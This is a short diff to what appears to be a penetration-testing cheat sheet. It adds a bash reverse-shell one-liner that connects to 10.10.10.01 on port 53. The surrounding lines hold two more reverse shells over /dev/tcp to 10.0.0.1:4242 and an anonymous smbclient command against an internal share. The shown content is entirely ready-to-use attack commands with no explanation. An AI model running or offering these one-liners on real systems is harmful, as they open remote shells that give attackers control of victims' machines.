@@ -37,6 +37,8 @@ smbclient -U ' ' \\\\172.16.1.10\\SlackMigration
 ```
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 
+bash -c 'bash -i >& /dev/tcp/10.10.10.01/53 0>&1'
+
 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
 ```
 
